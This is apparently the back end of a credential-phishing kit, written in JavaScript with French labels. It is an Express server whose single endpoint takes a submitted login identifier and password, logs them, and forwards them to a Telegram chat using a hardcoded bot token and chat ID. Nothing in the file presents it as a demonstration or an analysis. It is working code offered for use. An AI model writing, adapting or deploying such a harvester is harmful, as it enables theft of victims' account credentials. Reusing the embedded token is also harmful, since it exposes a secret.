import express from "express";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

const BOT_TOKEN = "8798036184:AAF79RiM_zC2TjbCwHh2w1jZpqVOoIv__y4";
const CHAT_ID = "8135402030";

app.post("/send-telegram", async (req, res) => {
  try {

    const { identifiant, mdp } = req.body;

    if (!identifiant || !mdp) {
      return res.status(400).json({
        success: false,
        error: "Identifiant et mdp requis"
      });
    }

    console.log("Reçu du site :", {
      identifiant,
      mdp
    });

    const message = `
Nouvelle connexion :

Identifiant : ${identifiant}
mdp : ${mdp}
`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }
    );

    const data = await response.json();

    console.log("Réponse Telegram :", data);

    if (!response.ok || !data.ok) {
      return res.status(500).json({
        success: false,
        error: "Erreur Telegram",
        details: data
      });
    }

    res.json({
      success: true
    });

  } catch (error) {

    console.error("Erreur :", error);

    res.status(500).json({
      success: false,
      error: "Erreur serveur"
    });

  }
});


const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Serveur lancé sur le port ${PORT}`);
});
